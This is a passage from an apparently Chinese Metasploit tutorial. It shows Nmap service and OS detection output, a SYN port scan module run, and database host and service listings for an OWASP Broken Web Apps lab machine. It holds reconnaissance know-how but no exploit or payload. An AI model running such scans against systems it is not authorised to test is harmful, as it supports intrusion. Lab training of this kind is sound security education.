<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span> <span class="nx">ssh</span><span class="o">-</span><span class="nx">hostkey</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span>   <span class="mi">1024</span> <span class="nx">ea</span><span class="p">:</span><span class="mi">83</span><span class="p">:</span><span class="mi">1</span><span class="nx">e</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">5</span><span class="nx">a</span><span class="p">:</span><span class="nx">a6</span><span class="p">:</span><span class="mi">8</span><span class="nx">c</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">1</span><span class="nx">c</span><span class="p">:</span><span class="mi">3</span><span class="nx">c</span><span class="p">:</span><span class="nx">e3</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="nx">dd</span><span class="p">:</span><span class="nx">fc</span><span class="p">:</span><span class="mi">88</span><span class="p">:</span><span class="nx">a5</span> <span class="p">(</span><span class="nx">DSA</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span><span class="nx">_</span>  <span class="mi">2048</span> <span class="mi">3</span><span class="nx">a</span><span class="p">:</span><span class="mi">94</span><span class="p">:</span><span class="nx">d8</span><span class="p">:</span><span class="mi">3</span><span class="nx">f</span><span class="p">:</span><span class="nx">e0</span><span class="p">:</span><span class="nx">a2</span><span class="p">:</span><span class="mi">7</span><span class="nx">a</span><span class="p">:</span><span class="nx">b8</span><span class="p">:</span><span class="nx">c3</span><span class="p">:</span><span class="mi">94</span><span class="p">:</span><span class="nx">d7</span><span class="p">:</span><span class="mi">5</span><span class="nx">e</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">0</span><span class="nx">c</span><span class="p">:</span><span class="nx">a7</span> <span class="p">(</span><span class="nx">RSA</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">http</span>        <span class="nx">Apache</span> <span class="nx">httpd</span> <span class="mf">2.2</span><span class="p">.</span><span class="mi">14</span> <span class="p">((</span><span class="nx">Ubuntu</span><span class="p">)</span> <span class="nx">mod_mono</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">3</span> <span class="nx">PHP</span><span class="o">/</span><span class="mf">5.3</span><span class="p">.</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="nx">ubuntu4</span><span class="p">.</span><span class="mi">5</span> <span class="kd">with</span> <span class="nx">Suhosin</span><span class="o">-</span><span class="nx">Patch</span> <span class="nx">mod_python</span><span class="o">/</span><span class="mf">3.3</span><span class="p">.</span><span class="mi">1</span> <span class="nx">Python</span><span class="o">/</span><span class="mf">2.6</span><span class="p">.</span><span class="mi">5</span> <span class="nx">mod_perl</span><span class="o">/</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">4</span> <span class="nx">Perl</span><span class="o">/</span><span class="nx">v5</span><span class="p">.</span><span class="mf">10.1</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span> <span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span><span class="nx">_</span>  <span class="nx">Potentially</span> <span class="nx">risky</span> <span class="nx">methods</span><span class="p">:</span> <span class="nx">TRACE</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span> <span class="nx">http</span><span class="o">-</span><span class="nx">robots</span><span class="p">.</span><span class="nx">txt</span><span class="p">:</span> <span class="mi">14</span> <span class="nx">disallowed</span> <span class="nx">entries</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span> <span class="sr">/administrator/</span> <span class="o">/</span><span class="nx">cache</span><span class="o">/</span> <span class="sr">/components/</span> <span class="o">/</span><span class="nx">images</span><span class="o">/</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span> <span class="sr">/includes/</span> <span class="o">/</span><span class="nx">installation</span><span class="o">/</span> <span class="sr">/language/</span> <span class="o">/</span><span class="nx">libraries</span><span class="o">/</span> <span class="sr">/media/</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span><span class="nx">_</span><span class="o">/</span><span class="nx">modules</span><span class="o">/</span> <span class="sr">/plugins/</span> <span class="o">/</span><span class="nx">templates</span><span class="o">/</span> <span class="sr">/tmp/</span> <span class="o">/</span><span class="nx">xmlrpc</span><span class="o">/</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span> <span class="nx">Apache</span><span class="o">/</span><span class="mf">2.2</span><span class="p">.</span><span class="mi">14</span> <span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span> <span class="nx">mod_mono</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">3</span> <span class="nx">PHP</span><span class="o">/</span><span class="mf">5.3</span><span class="p">.</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="nx">ubuntu4</span><span class="p">.</span><span class="mi">5</span> <span class="kd">with</span> <span class="nx">Suhosin</span><span class="o">-</span><span class="nx">Patch</span> <span class="nx">mod_python</span><span class="o">/</span><span class="mf">3.3</span><span class="p">.</span><span class="mi">1</span> <span class="nx">Python</span><span class="o">/</span><span class="mf">2.6</span><span class="p">.</span><span class="mi">5</span> <span class="nx">mod_perl</span><span class="o">/</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">4</span> <span class="nx">Perl</span><span class="o">/</span><span class="nx">v5</span><span class="p">.</span><span class="mf">10.1</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span> <span class="nx">Free</span> <span class="nx">CSS</span> <span class="nx">template</span> <span class="nx">by</span> <span class="nx">ChocoTemplates</span><span class="p">.</span><span class="nx">com</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span> <span class="nx">Samba</span> <span class="nx">smbd</span> <span class="mi">3</span><span class="p">.</span><span class="nx">X</span> <span class="p">(</span><span class="nx">workgroup</span><span class="p">:</span> <span class="nx">WORKGROUP</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="mi">143</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">imap</span>        <span class="nx">Courier</span> <span class="nx">Imapd</span> <span class="p">(</span><span class="nx">released</span> <span class="mi">2008</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span><span class="nx">_imap</span><span class="o">-</span><span class="nx">capabilities</span><span class="p">:</span> <span class="nx">completed</span> <span class="nx">CAPABILITY</span> <span class="nx">ACL</span> <span class="nx">QUOTA</span> <span class="nx">THREAD</span><span class="o">=</span><span class="nx">ORDEREDSUBJECT</span> <span class="nx">UIDPLUS</span> <span class="nx">OK</span> <span class="nx">ACL2</span><span class="o">=</span><span class="nx">UNIONA0001</span> <span class="nx">SORT</span> <span class="nx">CHILDREN</span> <span class="nx">IMAP4rev1</span> <span class="nx">NAMESPACE</span> <span class="nx">THREAD</span><span class="o">=</span><span class="nx">REFERENCES</span> <span class="nx">IDLE</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span> <span class="nx">Samba</span> <span class="nx">smbd</span> <span class="mi">3</span><span class="p">.</span><span class="nx">X</span> <span class="p">(</span><span class="nx">workgroup</span><span class="p">:</span> <span class="nx">WORKGROUP</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="mi">5001</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">java</span><span class="o">-</span><span class="nx">rmi</span>    <span class="nx">Java</span> <span class="nx">RMI</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span><span class="nx">_rmi</span><span class="o">-</span><span class="nx">dumpregistry</span><span class="p">:</span> <span class="nx">Registry</span> <span class="nx">listing</span> <span class="nx">failed</span> <span class="p">(</span><span class="nx">Handshake</span> <span class="nx">failed</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="mi">8080</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">http</span>        <span class="nx">Apache</span> <span class="nx">Tomcat</span><span class="o">/</span><span class="nx">Coyote</span> <span class="nx">JSP</span> <span class="nx">engine</span> <span class="mf">1.1</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span> <span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span><span class="nx">_</span>  <span class="nx">Potentially</span> <span class="nx">risky</span> <span class="nx">methods</span><span class="p">:</span> <span class="nx">PUT</span> <span class="nx">DELETE</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span> <span class="nx">Apache</span><span class="o">-</span><span class="nx">Coyote</span><span class="o">/</span><span class="mf">1.1</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span> <span class="nx">Apache</span> <span class="nx">Tomcat</span><span class="o">/</span><span class="mf">6.0</span><span class="p">.</span><span class="mi">24</span> <span class="o">-</span> <span class="nb">Error</span> <span class="nx">report</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="mi">1</span> <span class="nx">service</span> <span class="nx">unrecognized</span> <span class="nx">despite</span> <span class="nx">returning</span> <span class="nx">data</span><span class="p">.</span> <span class="nx">If</span> <span class="nx">you</span> <span class="nx">know</span> <span class="nx">the</span> <span class="nx">service</span><span class="o">/</span><span class="nx">version</span><span class="p">,</span> <span class="nx">please</span> <span class="nx">submit</span> <span class="nx">the</span> <span class="nx">following</span> <span class="nx">fingerprint</span> <span class="nx">at</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org/cgi-bin/submit.cgi?new-service :</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">SF</span><span class="o">-</span><span class="nx">Port5001</span><span class="o">-</span><span class="nx">TCP</span><span class="p">:</span><span class="nx">V</span><span class="o">=</span><span class="mf">7.01</span><span class="o">%</span><span class="nx">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="nx">D</span><span class="o">=</span><span class="mi">2</span><span class="o">/</span><span class="mi">16</span><span class="o">%</span><span class="nx">Time</span><span class="o">=</span><span class="mi">58</span><span class="nx">A5BA57</span><span class="o">%</span><span class="nx">P</span><span class="o">=</span><span class="nx">x86_64</span><span class="o">-</span><span class="nx">pc</span><span class="o">-</span><span class="nx">linux</span><span class="o">-</span><span class="nx">gnu</span><span class="o">%</span><span class="nx">r</span><span class="p">(</span><span class="nx">NU</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">SF</span><span class="p">:</span><span class="nx">LL</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="s2">"</span><span class="err">\</span><span class="s2">xac</span><span class="err">\</span><span class="s2">xed</span><span class="err">\</span><span class="s2">0</span><span class="err">\</span><span class="s2">x05"</span><span class="p">);</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="mi">00</span><span class="p">:</span><span class="mi">0</span><span class="nx">C</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="nx">DD</span><span class="p">:</span><span class="nx">B7</span><span class="p">:</span><span class="mi">5</span><span class="nx">B</span> <span class="p">(</span><span class="nx">VMware</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">Device</span> <span class="nx">type</span><span class="p">:</span> <span class="nx">general</span> <span class="nx">purpose</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">Running</span><span class="p">:</span> <span class="nx">Linux</span> <span class="mf">2.6</span><span class="p">.</span><span class="nx">X</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">OS</span> <span class="nx">CPE</span><span class="p">:</span> <span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">linux</span><span class="p">:</span><span class="nx">linux_kernel</span><span class="p">:</span><span class="mf">2.6</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">OS</span> <span class="nx">details</span><span class="p">:</span> <span class="nx">Linux</span> <span class="mf">2.6</span><span class="p">.</span><span class="mi">17</span> <span class="o">-</span> <span class="mf">2.6</span><span class="p">.</span><span class="mi">36</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">Network</span> <span class="nx">Distance</span><span class="p">:</span> <span class="mi">1</span> <span class="nx">hop</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">Service</span> <span class="nx">Info</span><span class="p">:</span> <span class="nx">OSs</span><span class="p">:</span> <span class="nx">Unix</span><span class="p">,</span> <span class="nx">Linux</span><span class="p">;</span> <span class="nl">CPE</span><span class="p">:</span> <span class="nl">cpe</span><span class="p">:</span><span class="sr">/o:linux:linux_kerne</span><span class="err">l
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="nx">Host</span> <span class="nx">script</span> <span class="nx">results</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span><span class="nx">_nbstat</span><span class="p">:</span> <span class="nx">NetBIOS</span> <span class="nx">name</span><span class="p">:</span> <span class="nx">OWASPBWA</span><span class="p">,</span> <span class="nx">NetBIOS</span> <span class="nx">user</span><span class="p">:</span> <span class="o">&lt;</span><span class="nx">unknown</span><span class="o">&gt;</span><span class="p">,</span> <span class="nx">NetBIOS</span> <span class="nx">MAC</span><span class="p">:</span> <span class="o">&lt;</span><span class="nx">unknown</span><span class="o">&gt;</span> <span class="p">(</span><span class="nx">unknown</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span> <span class="nx">smb</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">mode</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span>   <span class="nx">account_used</span><span class="p">:</span> <span class="nx">guest</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span>   <span class="nx">authentication_level</span><span class="p">:</span> <span class="nx">user</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span>   <span class="nx">challenge_response</span><span class="p">:</span> <span class="nx">supported</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span><span class="nx">_</span>  <span class="nx">message_signing</span><span class="p">:</span> <span class="nx">disabled</span> <span class="p">(</span><span class="nx">dangerous</span><span class="p">,</span> <span class="nx">but</span> <span class="k">default</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Nmap</span><span class="p">:</span> <span class="o">|</span><span class="nx">_smbv2</span><span class="o">-</span><span class="nx">enabled</span><span class="p">:</span> <span class="nx">Server</span> <span class="nx">doesn</span><span class="s1">'t support SMBv2 protocol
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   0.37 ms 10.10.10.129
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 21.11 seconds

</span></code></pre></div></div>

<p>执行db_services命令查看数据库中运行服务的扫描结果</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">db_services</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">The</span> <span class="nx">db_services</span> <span class="nx">command</span> <span class="nx">is</span> <span class="nx">DEPRECATED</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">Use</span> <span class="nx">services</span> <span class="nx">instead</span>

<span class="nx">Services</span>
<span class="o">========</span>

<span class="nx">host</span>          <span class="nx">port</span>  <span class="nx">proto</span>  <span class="nx">name</span>         <span class="nx">state</span>  <span class="nx">info</span>
<span class="o">----</span>          <span class="o">----</span>  <span class="o">-----</span>  <span class="o">----</span>         <span class="o">-----</span>  <span class="o">----</span>
<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  <span class="mi">21</span>    <span class="nx">tcp</span>    <span class="nx">ftp</span>          <span class="nx">open</span>   <span class="nx">vsftpd</span> <span class="mf">2.2</span><span class="p">.</span><span class="mi">2</span>
<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  <span class="mi">22</span>    <span class="nx">tcp</span>    <span class="nx">ssh</span>          <span class="nx">open</span>   <span class="nx">OpenSSH</span> <span class="mf">5.3</span><span class="nx">p1</span> <span class="nx">Debian</span> <span class="mi">3</span><span class="nx">ubuntu4</span> <span class="nx">Ubuntu</span> <span class="nx">Linux</span><span class="p">;</span> <span class="nx">protocol</span> <span class="mf">2.0</span>
<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  <span class="mi">80</span>    <span class="nx">tcp</span>    <span class="nx">http</span>         <span class="nx">open</span>   <span class="nx">Apache</span> <span class="nx">httpd</span> <span class="mf">2.2</span><span class="p">.</span><span class="mi">14</span> <span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span> <span class="nx">mod_mono</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">3</span> <span class="nx">PHP</span><span class="o">/</span><span class="mf">5.3</span><span class="p">.</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="nx">ubuntu4</span><span class="p">.</span><span class="mi">5</span> <span class="kd">with</span> <span class="nx">Suhosin</span><span class="o">-</span><span class="nx">Patch</span> <span class="nx">mod_python</span><span class="o">/</span><span class="mf">3.3</span><span class="p">.</span><span class="mi">1</span> <span class="nx">Python</span><span class="o">/</span><span class="mf">2.6</span><span class="p">.</span><span class="mi">5</span> <span class="nx">mod_perl</span><span class="o">/</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">4</span> <span class="nx">Perl</span><span class="o">/</span><span class="nx">v5</span><span class="p">.</span><span class="mf">10.1</span>
<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  <span class="mi">139</span>   <span class="nx">tcp</span>    <span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>  <span class="nx">open</span>   <span class="nx">Samba</span> <span class="nx">smbd</span> <span class="mi">3</span><span class="p">.</span><span class="nx">X</span> <span class="nx">workgroup</span><span class="p">:</span> <span class="nx">WORKGROUP</span>
<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  <span class="mi">143</span>   <span class="nx">tcp</span>    <span class="nx">imap</span>         <span class="nx">open</span>   <span class="nx">Courier</span> <span class="nx">Imapd</span> <span class="nx">released</span> <span class="mi">2008</span>
<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  <span class="mi">445</span>   <span class="nx">tcp</span>    <span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>  <span class="nx">open</span>   <span class="nx">Samba</span> <span class="nx">smbd</span> <span class="mi">3</span><span class="p">.</span><span class="nx">X</span> <span class="nx">workgroup</span><span class="p">:</span> <span class="nx">WORKGROUP</span>
<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  <span class="mi">5001</span>  <span class="nx">tcp</span>    <span class="nx">java</span><span class="o">-</span><span class="nx">rmi</span>     <span class="nx">open</span>   <span class="nx">Java</span> <span class="nx">RMI</span>
<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  <span class="mi">8080</span>  <span class="nx">tcp</span>    <span class="nx">http</span>         <span class="nx">open</span>   <span class="nx">Apache</span> <span class="nx">Tomcat</span><span class="o">/</span><span class="nx">Coyote</span> <span class="nx">JSP</span> <span class="nx">engine</span> <span class="mf">1.1</span>
</code></pre></div></div>

<h3 id="端口扫描">端口扫描</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">scanner</span><span class="o">/</span><span class="nx">portscan</span><span class="o">/</span><span class="nx">syn</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">syn</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nx">options</span> <span class="p">(</span><span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">portscan</span><span class="o">/</span><span class="nx">syn</span><span class="p">):</span>

   <span class="nx">Name</span>       <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>       <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">BATCHSIZE</span>  <span class="mi">256</span>              <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">hosts</span> <span class="nx">to</span> <span class="nx">scan</span> <span class="nx">per</span> <span class="kd">set</span>
   <span class="nx">INTERFACE</span>                   <span class="nx">no</span>        <span class="nx">The</span> <span class="nx">name</span> <span class="k">of</span> <span class="nx">the</span> <span class="kr">interface</span>
   <span class="nx">PORTS</span>      <span class="mi">1</span><span class="o">-</span><span class="mi">10000</span>          <span class="nx">yes</span>       <span class="nx">Ports</span> <span class="nx">to</span> <span class="nx">scan</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">g</span><span class="p">.</span> <span class="mi">22</span><span class="o">-</span><span class="mi">25</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">110</span><span class="o">-</span><span class="mi">900</span><span class="p">)</span>
   <span class="nx">RHOSTS</span>                      <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">target</span> <span class="nx">address</span> <span class="nx">range</span> <span class="nx">or</span> <span class="nx">CIDR</span> <span class="nx">identifier</span>
   <span class="nx">SNAPLEN</span>    <span class="mi">65535</span>            <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">bytes</span> <span class="nx">to</span> <span class="nx">capture</span>
   <span class="nx">THREADS</span>    <span class="mi">1</span>                <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">concurrent</span> <span class="nx">threads</span>
   <span class="nx">TIMEOUT</span>    <span class="mi">500</span>              <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">reply</span> <span class="nx">read</span> <span class="nx">timeout</span> <span class="k">in</span> <span class="nx">milliseconds</span>

<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">syn</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">RHOSTS</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>
<span class="nx">RHOSTS</span> <span class="o">=&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">syn</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">THREADS</span> <span class="mi">30</span>
<span class="nx">THREADS</span> <span class="o">=&gt;</span> <span class="mi">30</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">syn</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">run</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="nx">TCP</span> <span class="nx">OPEN</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">:</span><span class="mi">21</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="nx">TCP</span> <span class="nx">OPEN</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">:</span><span class="mi">22</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="nx">TCP</span> <span class="nx">OPEN</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">:</span><span class="mi">80</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="nx">TCP</span> <span class="nx">OPEN</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">:</span><span class="mi">139</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="nx">TCP</span> <span class="nx">OPEN</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">:</span><span class="mi">143</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="nx">TCP</span> <span class="nx">OPEN</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">:</span><span class="mi">445</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="nx">TCP</span> <span class="nx">OPEN</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">:</span><span class="mi">5001</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>  <span class="nx">TCP</span> <span class="nx">OPEN</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">:</span><span class="mi">8080</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">1</span> <span class="k">of</span> <span class="mi">1</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">100</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Auxiliary</span> <span class="nx">module</span> <span class="nx">execution</span> <span class="nx">completed</span>
</code></pre></div></div>

<p>查看扫描的结果</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">smb_version</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">hosts</span> <span class="o">-</span><span class="nx">c</span> <span class="nx">address</span><span class="p">,</span><span class="nx">os_flavor</span>

<span class="nx">Hosts</span>
<span class="o">=====</span>

<span class="nx">address</span>       <span class="nx">os_flavor</span>
<span class="o">-------</span>       <span class="o">---------</span>
<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.1</span>    
<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.2</span>    
<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  

<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">smb_version</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">hosts</span> <span class="o">-</span><span class="nx">c</span> <span class="nx">address</span><span class="p">,</span><span class="nx">os_flavor</span><span class="p">,</span><span class="nx">vuln_count</span>

<span class="nx">Hosts</span>
<span class="o">=====</span>

<span class="nx">address</span>       <span class="nx">os_flavor</span>  <span class="nx">vuln_count</span>
<span class="o">-------</span>       <span class="o">---------</span>  <span class="o">----------</span>
<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.1</span>               <span class="mi">0</span>
